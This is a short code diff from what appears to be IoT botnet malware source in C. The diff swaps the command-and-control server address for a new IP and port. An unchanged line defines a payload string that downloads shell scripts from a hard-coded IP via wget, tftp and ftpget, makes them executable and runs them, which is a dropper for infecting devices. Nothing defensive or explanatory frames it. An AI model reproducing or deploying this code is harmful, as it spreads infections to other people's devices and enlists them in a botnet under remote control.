@@ -61,7 +61,7 @@
 //--------------------------------------------------------------------------------------------------------------------------------------
 //--------------------------------------------------------------------------------------------------------------------------------------
 
-unsigned char *commServer[] = { "50.115.168.110:42516" }; //216.158.238.34:42516   0 - 65535
+unsigned char *commServer[] = { "129.151.189.68:27027" }; //216.158.238.34:42516   0 - 65535
 
 char *payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://199.19.225.2/bins.sh; chmod +x bins.sh; sh bins.sh; tftp 199.19.225.2 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 199.19.225.2; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 199.19.225.2 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh *";
 
